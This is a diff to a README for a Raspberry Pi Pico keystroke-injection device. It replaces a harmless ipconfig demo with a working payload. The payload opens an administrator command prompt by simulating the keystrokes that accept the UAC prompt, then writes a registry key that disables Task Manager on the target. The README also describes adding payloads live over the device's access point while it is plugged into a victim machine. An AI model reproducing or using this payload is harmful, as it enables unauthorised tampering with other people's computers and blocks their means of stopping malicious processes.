@@ -23,16 +23,29 @@ Open a web browser and go to 198.162.4.1 (this is the default ip of the pico), h
 
 ---
 ## Example payload
-This code here will open the powershell using the Win+r key and type ipconfig command which displays the IP configuration on the target.
+This payload here will disble the taskmanager by opening an admin terminal.
 ```text
-REM Opens PowerShell and runs ipconfig
-DELAY 1000
-GUI r
-DELAY 500
-STRING powershell
-ENTER
+REM disable task manager in windows
 DELAY 1500
-STRING ipconfig
+GUI
+DELAY 1000
+STRING cmd
+DELAY 500
+RIGHT
+DELAY 500
+DOWN
+DELAY 1500
+ENTER
+DELAY 1000
+LEFT
+ENTER
+DELAY 2000
+STRING reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
+DELAY 1000
+ENTER
+DELAY 500
+STRING exit
+DELAY 500
 ENTER
 ```
 Here you can change the `DELAY` time to 2 sec or other as some computers might take more time than 1 sec.<br>
@@ -40,3 +53,4 @@ Here you can change the `DELAY` time to 2 sec or other as some computers might t
 ---
 NOTE:
 This is just an example code, you can try to create your payloads and save it to the root of the rpi as an `.dd` file after completing the installation process as explained above.
+Or you can use the AP of the rpi to directly run and add payloads in real time while its pluged in to the target device.
